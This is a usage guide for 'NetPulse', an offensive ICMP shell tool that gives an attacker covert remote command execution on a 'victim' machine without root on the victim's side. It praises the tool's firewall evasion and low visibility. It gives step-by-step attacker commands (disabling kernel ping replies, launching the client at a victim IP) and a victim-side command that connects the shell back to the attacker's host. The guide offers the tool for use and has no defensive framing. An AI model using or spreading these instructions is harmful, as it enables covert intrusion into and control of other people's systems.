# NetPulse Usage Guide - ICMP SHELL Tool

NetPulse is an ICMP SHELL tool that does not require root access on the victim's side. This guide provides detailed information on how to use NetPulse.

## Advantages of NetPulse
- **No Root Access Required:** NetPulse eliminates the need for root access on the victim's side.
- **Camouflage:** ICMP traffic is common and often allowed in networks and firewalls.
- **Reduced Visibility:** ICMP messages leave no traces in the state tables of most firewalls.
- **Useful in Restrictive Networks:** In networks where TCP or UDP traffic is strictly controlled, ICMP can be an alternative.

## Disadvantages of NetPulse
- **Limited Shell:** NetPulse provides a limited and non-interactive shell.
- **Uncommon Traffic:** Traffic generated by NetPulse can be detected by intrusion detection systems.
- **High Latency:** Compared to a reverse shell, NetPulse is much slower.

## Attacker-Side Configuration
Attacker-side configuration is more complex and requires root access. Follow the steps below:

### Disable Kernel Auto-Response to Pings:

To disable the kernel's automatic ping response, use the `-s` flag:
```
$ sudo python3 netpulse.py -s
```

If you want to enable it again, you can use the same option.
This change is not permanent and will revert to the default upon system restart.

### Starting the Client

To start the client, execute the [netpulse.py](/netpulse.py) file with root permissions:

```bash
$ sudo python3 netpulse.py -i <interface> <victim-IP>
```
For more options, use the -h flag:
```bash
$ python3 netpulse.py -h
```

## Victim-Side Configuration
Victim-side configuration is simpler and does not require root access. Ensure that the following tools are installed:

- [iputils-ping](https://packages.debian.org/bullseye/iputils-ping) - Tool for testing the reachability of network hosts.
- [xxd](https://packages.debian.org/bullseye/xxd) - Tool for creating (or reversing) a hexadecimal dump.

If all the necessary tools are installed, run the [servnp.sh](/servnp.sh) file:
```bash
$ chmod +x servnp.sh && ./servnp.sh <attacker-IP>
```
